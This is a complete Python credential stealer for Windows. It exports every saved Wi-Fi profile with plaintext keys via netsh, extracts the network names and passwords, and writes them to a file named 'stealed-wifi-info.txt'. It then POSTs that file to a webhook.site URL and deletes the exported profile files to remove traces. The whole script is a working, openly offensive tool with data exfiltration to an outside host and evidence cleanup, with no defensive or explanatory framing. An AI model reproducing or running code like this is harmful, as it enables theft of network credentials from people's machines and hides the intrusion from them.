import os
import sys
import requests
import subprocess


# variables
wifi_files, wifi_names, wifi_passwords = [], [], []
output_file = 'stealed-wifi-info.txt'
url = 'https://webhook.site/d4e89880-9d24-4ae8-b3a5-65259c463a66'
current_path = os.getcwd()


# use python to execute windows command
command = subprocess.run(
    'netsh wlan export profile key=clear'.split(
        ' '), capture_output=True
).stdout.decode()


# gathering info
for filename in os.listdir(current_path):
    if filename.startswith('Wi-Fi') and filename.endswith('.xml'):
        wifi_files.append(filename)

for file in wifi_files:
    with open(file, 'r') as f:
        for line in f.readlines():
            if 'name' in line:
                wifi_names.append(line.strip()[6:-7])
            if 'keyMaterial' in line:
                wifi_passwords.append(line.strip()[13:-14])

for name, password in zip(wifi_names, wifi_passwords):
    sys.stdout = open(output_file, 'a')
    print('')
    print(f'SSID: {name}, PASSWORD: {password}')
    sys.stdout.close()

# send info throgh net
with open(output_file, 'rb') as f:
    requests.post(url=url, data=f.read())

# remove traces
for file in wifi_files:
    os.remove(file)
